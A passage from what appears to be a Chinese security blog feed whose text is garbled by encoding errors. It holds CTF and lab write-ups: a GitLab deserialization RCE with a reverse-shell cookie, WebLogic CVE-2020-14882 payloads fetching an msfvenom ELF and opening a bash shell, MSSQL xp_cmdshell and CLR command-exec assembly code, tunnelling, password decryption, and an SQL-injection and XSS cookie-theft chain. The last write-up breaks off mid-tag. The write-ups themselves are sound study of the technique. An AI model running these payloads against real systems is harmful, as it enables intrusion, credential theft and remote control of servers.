alt="image-20201210093620987"></p><p>æ‹¿åˆ°å…¶ä¸­<code>secret_key_base</code></p><p><img src="/2021/10/31/general/[HTB]Laboratory/image-20201210093721361.png" alt="image-20201210093721361"></p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>æˆ‘ä»¬éœ€è¦åœ¨æœ¬åœ°æ­ä¸€ä¸ªgiltlabï¼Œå¯ä»¥ç›´æ¥ä»dockeræ¨é•œåƒ</p><p>å°†æœ¬åœ°çš„<code>secret_key_base</code>æ›¿æ¢ï¼Œè¿›å…¥gitlab-rails console</p><p>ä¾æ¬¡æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request = ActionDispatch::Request.new(Rails.application.env_config)</span><br><span class="line">request.env[&quot;action_dispatch.cookies_serializer&quot;] = :marshal</span><br><span class="line">cookies = request.cookie_jar</span><br><span class="line">erb = ERB.new(&quot;&lt;%= `bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/ip/4444 0&gt;&amp;1&#x27;` %&gt;&quot;)</span><br><span class="line">depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, &quot;@result&quot;, ActiveSupport::Deprecation.new)</span><br><span class="line">cookies.signed[:cookie] = depr</span><br><span class="line">puts cookies[:cookie]</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/[HTB]Laboratory/image-20201210095023947.png" alt="image-20201210095023947"></p><p>æœ¬åœ°ç›‘å¬4444ï¼Œç”¨curlå‘åŒ…</p><p><code>curl -vvv &#39;https://git.laboratory.htb/users/sign_in&#39; -b &quot;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kieiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjQvNDQ0NCAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--1bdc8a5aa25ee2016f5912f3501514af5eb84c7b&quot; -k</code></p><p>æˆåŠŸå¼¹åˆ°shell</p><p><img src="/2021/10/31/general/[HTB]Laboratory/image-20201210095341130.png" alt="image-20201210095341130"></p><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥åˆ©ç”¨gitlab-rails consoleæ¥ä¿®æ”¹ç®¡ç†å‘˜è´¦æˆ·å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user = User.where(id: 1).first </span><br><span class="line">user.password = &#x27;12345678&#x27;</span><br><span class="line">user.password_confirmation = &#x27;12345678&#x27;</span><br><span class="line">user.save!</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/[HTB]Laboratory/image-20201210095920496.png" alt="image-20201210095920496"></p><p>ä¿®æ”¹æˆåŠŸï¼Œç”¨ç®¡ç†å‘˜ç™»å½•</p><p>ç®¡ç†å‘˜ä¸‹é¢æœ‰ä¸¤ä¸ªä»“åº“ï¼Œå…¶ä¸­ä¸€ä¸ªé‡Œé¢æœ‰ä¸ªsshç§é’¥ï¼Œå¯ä»¥åˆ©ç”¨sshç§é’¥æ— å¯†ç ç™»å½•ï¼Œä½†ç§é’¥ä½¿ç”¨çš„æ˜¯opensshæ ¼å¼ï¼Œæˆ‘ä»¬éœ€è¦è½¬æ¢ä¸ºrsaæ ¼å¼æ‰èƒ½ä½¿ç”¨</p><p>åˆ©ç”¨pyttygenå¯ä»¥è½¬æ¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puttygen test -o test.ppk</span><br><span class="line">puttygen test.ppk -O private-openssh -o test.oldformat</span><br></pre></td></tr></table></figure><p>æœ€åç›´æ¥ç§é’¥ç™»å½•æ‹¿åˆ°shell</p><p><img src="/2021/10/31/general/[HTB]Laboratory/image-20201210100428376.png" alt="image-20201210100428376"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISOON</title>
      <link href="/2021/10/31/general/isoon/"/>
      <url>/2021/10/31/general/isoon/</url>
      
        <content type="html"><![CDATA[<p>nmapæ‰«æç«¯å£</p><p><img src="/2021/10/31/general/isoon/image-20201210100956266.png" alt="image-20201210100956266"></p><p>8080ç«¯å£æœ‰webæœåŠ¡ï¼Œå‘ç°æ˜¯ä¸ªssrf</p><p>å¯ä»¥è¯»/etc/hosts</p><p><img src="/2021/10/31/general/isoon/image-20201210101221923.png" alt="image-20201210101221923"></p><p>ç»™äº†å†…ç½‘ç½‘æ®µï¼Œæ‰«ä¸€æ³¢å†…ç½‘ä¸»æœº</p><p><img src="/2021/10/31/general/isoon/image-20201210101547223.png" alt="image-20201210101547223"></p><p>å†…ç½‘119æœ‰ä¸»æœºå­˜æ´»ï¼Œç»§ç»­æ‰«æç«¯å£</p><p><img src="/2021/10/31/general/isoon/image-20201210104627492.png" alt="image-20201210104627492"></p><p><a href="http://192.168.57.119:7001æœ‰ä¸€ä¸ªwebæœåŠ¡ï¼Œä½¿ç”¨çš„æ˜¯weblogicæ¡†æ¶">http://192.168.57.119:7001æœ‰ä¸€ä¸ªwebæœåŠ¡ï¼Œä½¿ç”¨çš„æ˜¯weblogicæ¡†æ¶</a></p><p>WebLogic Server Version: 12.2.1.3.0</p><p>ä½¿ç”¨ï¼ˆCVE2020Â­14882/14883ï¼‰å¯ä»¥rce</p><h3 id="æ— å›æ˜¾"><a href="#æ— å›æ˜¾" class="headerlink" title="æ— å›æ˜¾"></a>æ— å›æ˜¾</h3><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨msfç”Ÿæˆä¸€ä¸ªelfé©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.10.191 lport=5555 -f elf &gt; test.elf</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.57.119:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#x27;wget http://192.168.10.192/test.elf&#x27;);&quot;)</span><br></pre></td></tr></table></figure><p>éœ€è¦æƒé™+X</p><h3 id="æœ‰å›æ˜¾"><a href="#æœ‰å›æ˜¾" class="headerlink" title="æœ‰å›æ˜¾"></a>æœ‰å›æ˜¾</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.57.119:7001/console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(&#x27;weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;);field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj); String cmd = req.getParameter(&quot;cmd&quot;);String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;if(cmd != null )&#123; String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(&quot;\\A&quot;).next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125; currentThread.interrupt();&#x27;)&amp;cmd=whoami</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/isoon/image-20201210103713000.png" alt="image-20201210103713000"></p><p>å°†payloadç¼–ç ä¸€ä¸‹ï¼Œåˆ©ç”¨ssrfå¼¹bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.57.119:7001/console/css/%2e%2e%2fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(&#x27;weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;);field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj); String cmd = req.getParameter(&quot;cmd&quot;);String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;if(cmd != null )&#123; String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(&quot;\\A&quot;).next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125; currentThread.interrupt();&#x27;)&amp;cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%30%2e%31%39%31%2f%34%34%34%34%20%30%3e%26%31%27</span><br></pre></td></tr></table></figure><p>cmdæ˜¯ç»è¿‡urlç¼–ç çš„bash</p><p><img src="/2021/10/31/general/isoon/image-20201210103954589.png" alt="image-20201210103954589"></p><p>æ‹¿åˆ°shellåæˆ‘ä»¬è¦ä¿¡æ¯æ”¶é›†ï¼Œåœ¨/home/weblogic/Oracle/Middleware/user_projects/domains/iSoonDomain/config/jdbc</p><p>æœ‰ä¸ªé…ç½®æ–‡ä»¶å‘ç°è¿äº†æ•°æ®åº“</p><p><img src="/2021/10/31/general/isoon/image-20201210105604364.png" alt="image-20201210105604364"></p><p>å°†/home/weblogic/Oracle/Middleware/user_projects/domains/iSoonDomain/securityã€SerializedSystemIni.dat</p><p>åˆ©ç”¨<a href="https://github.com/Ch1ngg/WebLogicPasswordDecryptorUi">weblogicè§£å¯†å·¥å…·</a>å¯ä»¥è§£å‡ºå¯†ç </p><p><img src="/2021/10/31/general/isoon/image-20201210105959231.png" alt="image-20201210105959231"></p><p>æˆ‘ä»¬éœ€è¦ç”¨è¿™å°æœºå™¨å½“è·³æ¿æœºæ¥è¿mssqlï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸ªä»£ç†</p><p>å¯ä»¥ä½¿ç”¨<code>ew</code>æˆ–<code>msf</code></p><blockquote><p><strong>EW</strong></p><p><a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><p>å…¬ç½‘</p><blockquote><p>./ew_for_linux64 -s rcsocks -l è½¬å‘ç«¯å£ -e æ¥æ”¶ç«¯å£</p></blockquote><p>å†…ç½‘</p><p>./ew_for_linux64 -s rssocks -d ç›®çš„ip -e å‘é€ç«¯å£</p></blockquote><blockquote><p><strong>msf</strong></p><p>run get_local_subnets # è·å–å†…ç½‘ç½‘æ®µ</p><p>run autoroute -s 10.223.71.0/24 # route add ç›®çš„ip 255.255.255.0 [session id] ä¸¤ç§æ–¹æ³•éƒ½å¯ä»¥ï¼Œç¬¬äºŒç§æ–¹å¼éœ€åœ¨sessionå¤–</p><p>use auxiliary/server/socks5</p><blockquote><p>SRVHOST   0.0.0.0          yes       The address to listen on<br>SRVPORT   1080             yes       The port to listen on</p></blockquote></blockquote><p>ä½¿ç”¨navicatè¿sqlserver</p><p>å¯ä»¥å¼€å¯xp_cmdshellå­˜å‚¨è¿›ç¨‹æ¥æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--æ‰“å¼€xp_cmdshell</span><br><span class="line"> EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;RECONFIGURE;</span><br><span class="line">--å…³é—­xp_cmdshell</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 0;RECONFIGURE;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/isoon/image-20201210110908057.png" alt="image-20201210110908057"></p><p>é¢„æœŸè§£è¯´æ˜¯åˆ©ç”¨clr</p><p>å°†ä¸‹é¢ä»£ç ä¿å­˜ä¸ºcmd_exec.cs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">using System.Data;</span><br><span class="line">using System.Data.SqlClient;</span><br><span class="line">using System.Data.SqlTypes;</span><br><span class="line">using Microsoft.SqlServer.Server;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">public partial class StoredProcedures</span><br><span class="line">&#123;</span><br><span class="line">    [Microsoft.SqlServer.Server.SqlProcedure]</span><br><span class="line">    public static void cmd_exec (SqlString execCommand)</span><br><span class="line">    &#123;</span><br><span class="line">        Process proc = new Process();</span><br><span class="line">        proc.StartInfo.FileName = @&quot;C:\Windows\System32\cmd.exe&quot;;</span><br><span class="line">        proc.StartInfo.Arguments = string.Format(@&quot; /C &#123;0&#125;&quot;, execCommand.Value);</span><br><span class="line">        proc.StartInfo.UseShellExecute = false;</span><br><span class="line">        proc.StartInfo.RedirectStandardOutput = true;</span><br><span class="line">        proc.Start();</span><br><span class="line"></span><br><span class="line">        // Create the record and specify the metadata for the columns.</span><br><span class="line">        SqlDataRecord record = new SqlDataRecord(new SqlMetaData(&quot;output&quot;, SqlDbType.NVarChar, 4000));</span><br><span class="line"></span><br><span class="line">        // Mark the beginning of the result set.</span><br><span class="line">        SqlContext.Pipe.SendResultsStart(record);</span><br><span class="line"></span><br><span class="line">        // Set values for each column in the row</span><br><span class="line">        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());</span><br><span class="line"></span><br><span class="line">        // Send the row back to the client.</span><br><span class="line">        SqlContext.Pipe.SendResultsRow(record);</span><br><span class="line"></span><br><span class="line">        // Mark the end of the result set.</span><br><span class="line">        SqlContext.Pipe.SendResultsEnd();</span><br><span class="line"></span><br><span class="line">        proc.WaitForExit();</span><br><span class="line">        proc.Close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>windows  .netè‡ªå¸¦csc.exeï¼Œä¸‹é¢å‘½ä»¤å¯ä»¥æ‰¾åˆ°csc.exeè·¯å¾„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ChildItem -Recurse &quot;C:\Windows\Microsoft.NET\&quot; -Filter &quot;csc.exe&quot; | Sort-Object fullname -Descending | Select-Object fullname -First 1 -ExpandProperty fullname</span><br></pre></td></tr></table></figure><p>ç„¶åç¼–è¯‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library C:/Users/kai/Desktop/cmd_exec.cs</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦å°†dllæ–‡ä»¶è½¬æˆhexæ‰èƒ½ä½¿ç”¨,ä½¿ç”¨ä¸‹æ–¹powershellè„šæœ¬å¯ä»¥è½¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$assemblyFile = &quot;C:\Users\kai\Desktop\cmd_exec.dll&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$stringBuilder = New-Object -Type System.Text.StringBuilder </span><br><span class="line">$stringBuilder.Append(&quot;CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM `n0x&quot;) | Out-Null</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$fileStream = [IO.File]::OpenRead($assemblyFile)</span><br><span class="line">while (($byte = $fileStream.ReadByte()) -gt -1) &#123;</span><br><span class="line">    $stringBuilder.Append($byte.ToString(&quot;X2&quot;)) | Out-Null</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$stringBuilder.AppendLine(&quot;\nWITH PERMISSION_SET = UNSAFE&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot; &quot;) | Out-Null</span><br><span class="line"></span><br><span class="line">$stringBuilder.AppendLine(&quot;CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot; &quot;) | Out-Null</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$stringBuilder.AppendLine(&quot;EXEC[dbo].[cmd_exec] &#x27;whoami&#x27;&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot; &quot;) | Out-Null</span><br><span class="line"></span><br><span class="line">$stringBuilder.ToString() -join &quot;&quot; | Out-File C:\Users\kai\Desktop\cmd_exec.txt</span><br></pre></td></tr></table></figure><p>ä»¥sysadminç™»å½•mssqlæ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Sp_Configure &#x27;clr enabled&#x27;, 1</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">ALTER DATABASE master SET TRUSTWORTHY ON;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM </span><br><span class="line">0x4D5A90000300000004000000F[TRUNCATED]</span><br><span class="line">WITH PERMISSION_SET = UNSAFE </span><br><span class="line">GO </span><br><span class="line"></span><br><span class="line">CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];</span><br><span class="line">GO</span><br><span class="line"> </span><br><span class="line">EXEC[dbo].[cmd_exec] &#x27;whoami&#x27;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>cmd_exec &#39;whoami&#39;</code>å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤</p><p>ä½†æ˜¯æ­¤æœºå™¨æ— å¤–ç½‘ ï¼Œæ— æ³•åå¼¹webshell</p><p>ä¸è¿‡msfå¦‚æœç›‘å¬çš„æ˜¯è·³æ¿æœºï¼Œé‚£ä»–ä¼šåœ¨è·³æ¿æœºå¼€ä¸€ä¸ªç«¯å£ç›‘å¬ï¼Œç›´æ¥åå‘é“¾æ¥ï¼ˆps:u1s1ç‹ç¥çœŸå¼º</p><p>ä½¿ç”¨msfè‡ªå¸¦payload</p><p><img src="/2021/10/31/general/isoon/image-20201210202255351.png" alt="image-20201210202255351"></p><p>æˆåŠŸå¼¹åˆ°shell</p><p>whoami  /priv å‘ç°æœ‰<code>SeImpersonatePrivilege</code>æƒé™</p><p>å¯ä»¥ä½¿ç”¨potatoææƒ</p>]]></content>
      
      
      
        <tags>
            
            <tag> study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dockerå’Œphpstormæ­å»ºphpå¼€å‘ç¯å¢ƒ</title>
      <link href="/2021/10/31/general/docker%E5%92%8Cphpstorm%E6%90%AD%E5%BB%BAphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
      <url>/2021/10/31/general/docker%E5%92%8Cphpstorm%E6%90%AD%E5%BB%BAphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>é¦–å…ˆdocker-composeå¯åŠ¨php5.6ã€php7.4ã€mysql5.6ä¸‰ä¸ªå®¹å™¨ï¼Œå¹¶å»ºç«‹è¿æ¥</p><p><img src="/2021/10/31/general/docker%E5%92%8Cphpstorm%E6%90%AD%E5%BB%BAphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20210319185351082.png" alt="image-20210319185351082"></p><p><img src="/2021/10/31/general/docker%E5%92%8Cphpstorm%E6%90%AD%E5%BB%BAphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20210319185303646.png" alt="image-20210319185303646"></p><p>ä»¥ä¸Šæ­¥éª¤å®Œå…¨å¯ä»¥é€šè¿‡docker-composeä¸Dockerfileå®ç°ï¼Œå‡ºäºæ‡’</p><p>å’•å’•å’•ğŸ•Š</p><p>å’•å’•å’•ç»“æŸ</p><p><a href="https://github.com/falipan/phpstorm-docker-php-mysql">é€ä¸Šgithubé¡¹ç›®</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HardXsså¤ç°</title>
      <link href="/2021/10/31/general/%5BQWB%5DHardXss/"/>
      <url>/2021/10/31/general/%5BQWB%5DHardXss/</url>
      
        <content type="html"><![CDATA[<h1 id="QWB-HardXsså¤ç°"><a href="#QWB-HardXsså¤ç°" class="headerlink" title="[QWB]HardXsså¤ç°"></a>[QWB]HardXsså¤ç°</h1><h2 id="ç™»é™†-sqlæ³¨å…¥"><a href="#ç™»é™†-sqlæ³¨å…¥" class="headerlink" title="ç™»é™†(sqlæ³¨å…¥)"></a>ç™»é™†(sqlæ³¨å…¥)</h2><p>æ‹¿åˆ°é¡µé¢ååªæœ‰ä¸€ä¸ªç™»é™†æ¡†å’Œä¸€ä¸ªæäº¤åé¦ˆçš„é¡µé¢ï¼Œæäº¤åé¦ˆç•Œé¢éœ€è¦ç™»é™†</p><p>ç™»é™†æ¡†çš„è¯ï¼Œè‚¯å®šå…ˆæµ‹è¯•æ³¨å…¥</p><p>å‘ç°è¿‡æ»¤äº†ç©ºæ ¼ï¼Œç©ºæ ¼ç»•è¿‡å¸¸è§„æ“ä½œ<code>admin&#39;or(1)#</code></p><p>ç™»é™†æˆåŠŸï¼Œä½†æ˜¯å‘ç°responseåŒ…å«Set-Cookieï¼Œå¹¶ä¸”è®¾ç½®äº†domain</p><p><img src="/2021/10/31/general/[QWB]HardXss/image-20210622220457053.png" alt="image-20210622220457053"></p><p>åªèƒ½æ‰‹åŠ¨è®¾ç½®cookieå¹¶ç™»é™†</p><p>ç™»é™†è¿›å»æ˜¯ä¸€ä¸ª/admin/ç•Œé¢ï¼Œå¹¶ä¸”åªæœ‰ä¸€ä¸ªå¤´åƒä¸Šä¼ åŠŸèƒ½ï¼Œå¹¶ä¸”å¸¦é¢„è§ˆï¼Œå‘ç°å…è®¸ä¸Šä¼ çš„ç±»å‹ä¸­åŒ…å«svg</p><p><img src="/2021/10/31/general/[QWB]HardXss/image-20210622221455914.png" alt="image-20210622221455914"></p><p>åœ¨æºç é‡Œè¿˜å‘ç°ä¸€ä¸ªdisplay:noneæ ‡ç­¾</p><p><code>&lt;a href=&quot;https://flaaaaaaaag.cubestone.com?secret=demo&quot; style=&quot;display:none&quot;&gt;å†…ç½‘ç®¡ç†ä¸­å¿ƒ&lt;/a&gt;</code></p><p>è€Œåœ¨æˆ‘ä»¬åˆšåˆšç™»é™†ä¹‹å‰çš„ç•Œé¢é‡Œè¿˜æœ‰ä¸€ä¸ªæäº¤åé¦ˆåŠŸèƒ½ç‚¹</p><p>é‡Œé¢æœ‰é“¾æ¥å‚æ•°æ¡†ï¼Œç»æ£€æµ‹ï¼Œä¼šæœ‰robotå»è®¿é—®æˆ‘ä»¬çš„é“¾æ¥</p><p><img src="/2021/10/31/general/[QWB]HardXss/image-20210622222954950.png" alt="image-20210622222954950"></p><p><img src="/2021/10/31/general/[QWB]HardXss/image-20210622223026416.png" alt="image-20210622223026416"></p><p>çœ‹äº†å¤§ä½¬çš„æ–‡ç« ï¼Œå‘ç°å¾ˆå¤šéé¢„æœŸéƒ½æ˜¯åˆ©ç”¨ä½ç‰ˆæœ¬çš„chrome_1dayï¼Œè¿™é‡Œçš„chromeç‰ˆæœ¬åœ¨â€“no-sanboxä¸‹çš„ç¡®å¯ä»¥æˆåŠŸï¼Œä½†æ˜¯è¿™ç§æ€è·¯å¹¶ä¸æ˜¯ä½œè€…çš„é¢„æœŸè§£</p><p>æ ¹æ®ä¸Šé¢è¿™å‡ ç‚¹æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“çš„è”æƒ³åˆ°åˆ©ç”¨xssæ¥ssrfï¼Œæˆ‘ä»¬å…ˆå°è¯•è·å–ç®¡ç†å‘˜cookie</p><p>åˆ©ç”¨<a href="https://xss.pt/">xss.pt</a>å¹³å°æ¥æ”¶cookie</p><p><img src="/2021/10/31/general/[QWB]HardXss/image-20210622222351597.png" alt="image-20210622222351597"></p><p><img src="/2021/10/31/general/[QWB]HardXss/image-20210622223520619.png" alt="image-20210622223520619"></p><p>ä½†æ˜¯ä¸‹é¢ä¸€ä¸ªé—®é¢˜ï¼Œè¯¥å¦‚ä½•è®©robotå»è®¿é—®<code>https://flaaaaaaaag.cubestone.com/?secret=demo</code></p><p>å› ä¸ºå­˜åœ¨è·¨åŸŸé—®é¢˜ï¼Œè¿™æ ·æˆ‘ä»¬çš„jså°±æ— æ³•å®ç°å»è®¿é—®</p><p>çœ‹äº†å¤§ä½¬çš„æ–‡ç« ï¼ŒçŸ¥é“è¿™é‡Œå¯ä»¥åˆ©ç”¨xxeæ¥å®ç°</p><p>æ„é€ xxeçš„dtdæ”¾åˆ°vpsä¸Š,svgé…åˆxxeçš„payloadçš„åœ¨<a 